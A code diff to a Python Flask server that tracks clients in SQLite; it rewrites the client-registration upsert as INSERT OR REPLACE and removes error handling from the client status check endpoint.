@@ -67,8 +67,10 @@ class ClientRegister(Resource):
         with sqlite3.connect(DB_FILE) as conn:
             cursor = conn.cursor()
             try:
-                cursor.execute("INSERT INTO clients (ip, last_checkin, status) VALUES (?, ?, ?) ON CONFLICT(ip) DO UPDATE SET last_checkin=?, status='active'",
-                               (client_ip, datetime.now().isoformat(), 'active', datetime.now().isoformat()))
+                cursor.execute("""
+                    INSERT OR REPLACE INTO clients (ip, last_checkin, status) 
+                    VALUES (?, ?, 'active')
+                """, (client_ip, datetime.now().isoformat()))
                 conn.commit()
                 return jsonify({"status": "success", "message": "Client registered successfully."})
             except sqlite3.Error as e:
@@ -94,14 +96,11 @@ class ClientCheck(Resource):
         client_ip = request.remote_addr
         with sqlite3.connect(DB_FILE) as conn:
             cursor = conn.cursor()
-            try:
-                cursor.execute("SELECT status FROM clients WHERE ip = ?", (client_ip,))
-                result = cursor.fetchone()
-                if result:
-                    return jsonify({"status": "success", "command": result[0]})
-                return jsonify({"status": "fail", "message": "Client not registered."})
-            except sqlite3.Error as e:
-                return jsonify({"status": "fail", "message": f"Database error: {str(e)}"})
+            cursor.execute("SELECT status FROM clients WHERE ip = ?", (client_ip,))
+            result = cursor.fetchone()
+            if result:
+                return jsonify({"status": "success", "command": result[0]})
+            return jsonify({"status": "fail", "message": "Client not registered."})
 
 class LogUpload(Resource):
     def post(self):
